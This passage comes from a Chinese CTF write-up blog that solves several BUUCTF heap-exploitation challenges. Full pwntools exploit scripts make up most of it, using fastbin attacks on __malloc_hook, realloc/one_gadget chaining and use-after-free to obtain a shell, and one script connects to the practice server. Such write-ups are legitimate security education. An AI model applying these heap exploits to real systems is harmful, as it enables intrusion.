&lt;main_arena+176&gt;:\t0x00007f92af6c2bb8\t0x00007f92af6c2bc8</span><br></pre></td></tr></table></figure>\n<p>在上面我们已经泄露了libc基址，下面就是覆盖malloc_hook</p>\n<p>首先肯定是fastbin attack，将fd指针指向malloc_hook的附近地址，这里选择了有7f的地方，因为7f&gt;71所以可以被伪造，之后就是计算偏移，将one_gadget写入堆块中，直接调用就可以</p>\n<p>下面是成功写入one_gadget的截图</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224145651167.png\" alt=\"image-20210224145651167\"></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",26260)</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn23\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Size: '</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">'Size: '</span>)</span><br><span class=\"line\">\tsl(str(len(content)))</span><br><span class=\"line\">\tru(<span class=\"string\">'Content: '</span>)</span><br><span class=\"line\">\ts(content)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'4'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tp.recvline()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p.recvline()</span><br><span class=\"line\"> </span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x80</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload += p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">fill(<span class=\"number\">1</span>,<span class=\"string\">'aaaa'</span>)</span><br><span class=\"line\">fill(<span class=\"number\">2</span>,<span class=\"string\">'bbbb'</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x80</span>)<span class=\"comment\">#防止合并</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">libc_base = u64(dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>].strip().ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">payload = p64(libc_base+<span class=\"number\">0x3c4aed</span>)</span><br><span class=\"line\">fill(<span class=\"number\">2</span>, payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">payload = p8(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(libc_base+<span class=\"number\">0x4526a</span>)</span><br><span class=\"line\">fill(<span class=\"number\">6</span>, payload)</span><br><span class=\"line\">allocate(<span class=\"number\">255</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"V-amp-N2020-公开赛-simpleHeap-realloc-onegadget\"><a href=\"#V-amp-N2020-公开赛-simpleHeap-realloc-onegadget\" class=\"headerlink\" title=\"[V&amp;N2020 公开赛]simpleHeap(realloc+onegadget)\"></a>[V&amp;N2020 公开赛]simpleHeap(realloc+onegadget)</h2><p>四个功能的堆</p>\n<ol>\n<li>add</li>\n<li>edit</li>\n<li>show</li>\n<li>delete</li>\n</ol>\n<p>add</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155042717.png\" alt=\"image-20210224155042717\"></p>\n<p>edit</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155220384.png\" alt=\"image-20210224155220384\"></p>\n<p>show</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155623947.png\" alt=\"image-20210224155623947\"></p>\n<p>del</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155639109.png\" alt=\"image-20210224155639109\"></p>\n<h3 id=\"漏洞点：-1\"><a href=\"#漏洞点：-1\" class=\"headerlink\" title=\"漏洞点：\"></a>漏洞点：</h3><ol>\n<li>很明显，这里有单字节溢出漏洞</li>\n</ol>\n<h3 id=\"思路：-1\"><a href=\"#思路：-1\" class=\"headerlink\" title=\"思路：\"></a>思路：</h3><ol>\n<li>只有单字节溢出，可以更改chunk的size，所以第一步就是获取libc，通常就是拿unsorted bin的fd bk指针来获取。分配4块chunk，第一块用来更改后面的size，第二块直接释放进入unsorted bin中，第三块打印fd bk指针，第四块防止被合并</li>\n<li>第二步就是写onegadget，将fastbin chunk里的fd指针指向malloc_hook伪造的chunk，然后写就行了，这里下面会说。</li>\n</ol>\n<h3 id=\"技巧：-1\"><a href=\"#技巧：-1\" class=\"headerlink\" title=\"技巧：\"></a>技巧：</h3><ol>\n<li>这里onegadget写入的时候是写入realloc中</li>\n</ol>\n<blockquote>\n<p>先看onegadget</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225152559448.png\" alt=\"image-20210225152559448\"></p>\n<p>我们这里用0x4526a</p>\n<p>这里运用了malloc_hook和realloc_hook相结合，首先我们在malloc_hook中写入realloc_hook,然后再realloc_hook中写入onegadget,这样我们先执行一下，看一下效果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;realloc &#x3D; libc_base + 0x846C0</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225153626853.png\" alt=\"image-20210225153626853\"></p>\n<p>直接运行到这里</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225154202313.png\" alt=\"image-20210225154202313\"></p>\n<p>可以看到有3个0的地方，那么怎么是rsp+0x30移到指定位置呢？</p>\n<p>上面realloc中已经有push可以改变栈帧，我们只需要改变程序执行位置就可以。</p>\n<p>我们可以少几个push,因为push可以是rsp变小，那减少就会变大。</p>\n<p>由于各个函数栈帧的变化，这个还是得多试一试。</p>\n<p>具体函数执行顺序</p>\n<p><strong>调用malloc函数——&gt;判断是否有malloc_hook，有则调用之——&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行——&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之——&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。</strong></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29222</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn24\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"size?\"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"content:\"</span>)</span><br><span class=\"line\">\ts(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">\"content:\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">4</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">payload = <span class=\"string\">'\\x00'</span>*<span class=\"number\">0x28</span> + <span class=\"string\">'\\xE1'</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">libc_base=uu64(r(<span class=\"number\">6</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">malloc_hook = libc_base + libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"malloc_hook\"</span>,malloc_hook)</span><br><span class=\"line\">realloc = libc_base + <span class=\"number\">0x846CC</span>    <span class=\"comment\">#本地与远程区别主要在这里</span></span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br><span class=\"line\">leak(<span class=\"string\">\"realloc\"</span>,realloc)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#4 -&gt;2</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(malloc_hook<span class=\"number\">-0x23</span>)+<span class=\"string\">'\\n'</span></span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\x00'</span>*(<span class=\"number\">0x13</span><span class=\"number\">-8</span>) + p64(one_gadget)+p64(realloc))</span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">'choice: '</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">sla(<span class=\"string\">'size?'</span>,<span class=\"string\">'32'</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-ydsneedgirlfriend2\"><a href=\"#BJDCTF-2nd-ydsneedgirlfriend2\" class=\"headerlink\" title=\"[BJDCTF 2nd]ydsneedgirlfriend2\"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h2><p>UAF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3.9\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",25561)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0400D86</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"AAAA\"</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(magic))</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"babyfengshui-33c3-2016\"><a 